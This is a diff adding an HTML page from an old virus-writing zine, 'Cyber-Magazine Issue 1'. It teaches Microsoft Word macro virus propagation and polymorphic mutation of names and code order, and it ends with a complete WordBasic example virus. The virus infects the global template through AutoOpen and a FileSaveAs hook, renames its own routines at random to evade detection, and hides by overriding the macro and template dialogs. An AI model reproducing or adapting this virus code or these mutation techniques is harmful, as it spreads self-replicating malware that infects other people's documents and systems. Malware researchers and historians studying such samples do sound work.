@@ -1,0 +1,279 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Cyber-Magazine - Issue #1</TITLE>
+   
+</HEAD>
+<BODY background="tuback01.gif" link="#800000">
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Cyber-Magazine<BR>
+</FONT><FONT SIZE=+1>Issue 1 <BR>
+by CyberPhantom</FONT></FONT></B></P></CENTER>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+<P>This magazine/tutorial is dedicated to exploration of other techniques
+available for Microsoft Word Macro Virus propagation. </P>
+
+<P><B>First: </B></P>
+
+<P>It is possible to propagate macros other than with the standard MacroCopy
+command. It is possible to use the ToolsMacro. Edit command to create a
+new macro and then insert text into it directly. The text can be copied
+out of the creating macro using LineUp, LineDown, CharLeft, and CharRight
+commands with the X, 1 flag set to select the desired text. Follow this
+with an EditCopy command and the EditPaste in the &quot;blank&quot; macro
+and you have created a macro without using the MacroCopy command. </P>
+
+<P>This functionality allows you to store all of your macros in one single
+macro while in &quot;transit&quot; (an infected document) and to &quot;extract&quot;
+the macros upon delivery to the target (NORMAL.DOT to be infected), including
+your stealth macros (unless, of course, your stealth macros ARE the infection
+vector). (<A HREF="#example">see example virus</A>) </P>
+
+<P><B>Second: </B></P>
+
+<P>More Mutation: Using the above technique as a starting point, it is
+possible to create better mutation than just mutating macro names. It is
+in fact possible to create mutating variable names and mutating Sub/Function
+names. </P>
+
+<P>To do so, it is imperative that your code knows exactly where and long
+the variable/routine-name to be mutated is (at least one sample of it).
+If you know that one location in a macro will never change, you can use
+that. Then, you can read in the fixed length name with the GetText$(X,X)
+command. Now, run your random name generator (making certain to generate
+a name that is THE SAME LENGTH). Finally, use the EditReplace command to
+swap out all of the old names for the new names. (<A HREF="#example">see
+example virus</A>) </P>
+
+<P>You could also keep a separate &quot;dummy&quot; macro or routine that
+just stores a list of your ever mutating variable names so that you could
+have mutating lengths as well. That way, you could just read in the first
+line in the list as your current variable, mutate it, then do your global
+replace, then move on to the next in your list. </P>
+
+<P>i.e.: </P>
+
+<UL>
+<PRE>sub dummy
+LKJIIEKDG                   &lt; ---- first variable
+LKJS
+LKJSOALKJBIEWDLA
+POIEWM
+SIEFQZCVWT
+YJFHBWPVU                   &lt; -----last variable
+end sub
+</PRE>
+</UL>
+
+<P><B>Third: </B></P>
+
+<P>Even More Mutation: Using a combination of the above techniques, it
+is possible to create mutating code segments. That is, segments of code
+that change locations within the body of the code. </P>
+
+<P>Consider if you will: You could create a macro with several subroutines
+of exactly the same length. Then when it was time to mutate (say at the
+next document infection), just use your knowledge that your have three
+subroutines of exactly the same length, starting at line X below the calling
+routine, and jumble them around. </P>
+
+<P>i.e. </P>
+
+<UL>
+<PRE>sub Main
+   segmentA
+   segmentB
+   segmentC
+end sub
+
+sub segmentA
+    do some stuff
+end sub
+
+sub segmentB
+   do some other stuff
+end sub
+
+sub segmentC
+   do strange stuff
+end sub
+
+could become:
+
+sub Main
+   segmentA
+   segmentB
+   segmentC
+end sub
+
+sub segmentB
+   do some other stuff
+end sub
+
+sub segmentC
+   do strange stuff
+end sub
+
+sub segmentA
+    do some stuff
+end sub
+
+or it could become:
+
+sub Main
+   segmentA
+   segmentB
+   segmentC
+end sub
+
+sub segmentB
+   do some other stuff
+end sub
+
+sub segmentA
+    do some stuff
+end sub
+
+sub segmentC
+   do strange stuff
+end sub
+</PRE>
+</UL>
+
+<P>Or it could become ANY permutation in the set! Plus, the more subroutines
+you have to &quot;jumble,&quot; the better the mutation becomes! </P>
+
+<P><B>Fourth: </B></P>
+
+<P>The future? Only you can determine what's in the future. Be creative!
+</P>
+
+<P>-CyberPhantom </P>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+<PRE><A NAME="example"></A>Example Virus:  (Infected Document Code)
+===============================
+Sub MAIN
+On Error Resume Next
+ToolsMacro .Name = &quot;autoopen&quot;, .Show = 1, .Delete
+ToolsMacro .Name = &quot;FileSaveAs&quot;, .Show = 1, .Delete
+ToolsMacro .Name = &quot;XXXXX&quot;, .Show = 1, .Delete
+AppMinimize
+ToolsMacro .Name = &quot;autoopen&quot;, .Edit, .Show = 3
+StartOfDocument
+EndOfDocument 1
+EditCopy
+DocClose
+ToolsMacro .Name = &quot;XXXXX&quot;, .Show = 1, .Edit
+StartOfDocument
+EndOfDocument 1
+EditPaste
+DocClose 1
+ToolsMacro .Name = &quot;XXXXX&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 35
+LineDown 9, 1
+EditCopy
+DocClose
+ToolsMacro .Name = &quot;FileSaveAs&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 1
+EndOfDocument 1
+EditPaste
+DocClose 1
+mutat
+Payld
+stlth
+AppRestore
+End Sub
+
+Sub FlSvA
+Dim _fldg As FileSaveAs
+GetCurValues _fldg
+Dialog _fldg
+If _fldg.Format = 0 Then _fldg.Format = 1
+FlNm$ = FileName$()
+FlMcr$ = FlNm$ + &quot;:AutoOpen&quot;
+MacroCopy &quot;Global:XXXXX&quot;, FlMcr$
+FileSaveAs _fldg
+End Sub
+
+Function Rndnm$
+For count = 1 To 5
+   rndnx = Int(Rnd() * (90 - 65) + 65)
+   rndnx$ = rndnx$ + Chr$(rndnx)
+Next count
+Rndnm$ = rndnx$
+End Function
+
+Sub Payld
+Rndnm = Int(Rnd() * (51  -  1) + 1)
+If Rndnm = 50 Then MsgBox &quot;Greetings to: CyberDragon, CyberMonk, CyberBard, CyberSage, CyberTeck, CyberHawk, CyberBeef, CyberLich, CyberKnight.  From: CyberPhantom&quot;
+End Sub
+
+Sub mutat
+ToolsMacro .Name = &quot;XXXXX&quot;, .Edit, .Show = 1
+StartOfDocument
+dnatx$ = GetText$(606, 611)'mutat
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(648, 653)'FlSvA
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(658, 663)'_fldg
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(612, 617)'Payld
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(869, 874)'Rndnm
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(880, 885)'count
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+dnatx$ = GetText$(1299, 1304)'dnatx
+EditReplace .Find = dnatx$, .Replace = Rndnm$, .Direction = 0, .MatchCase = 0, .WholeWord = 0, .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0, .Wrap = 1, .FindAllWordForms = 0
+DocClose 1
+End Sub
+
+Sub stlth
+ToolsMacro .Name = &quot;XXXXX&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 123
+LineDown 2, 1
+EditCopy
+DocClose
+ToolsMacro .Name = &quot;ToolsMacro&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 1
+EndOfDocument 1
+EditPaste
+DocClose 1
+
+ToolsMacro .Name = &quot;XXXXX&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 127
+LineDown 2, 1
+EditCopy
+DocClose
+ToolsMacro .Name = &quot;FileTemplates&quot;, .Edit, .Show = 1
+StartOfDocument
+LineDown 1
+EndOfDocument 1
+EditPaste
+DocClose 1
+End Sub
+
+Sub TlsMc
+'No Macro
+End Sub
+
+Sub FlTpt
+'No Macro
+End Sub
+</PRE>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+</BODY>
+</HTML>
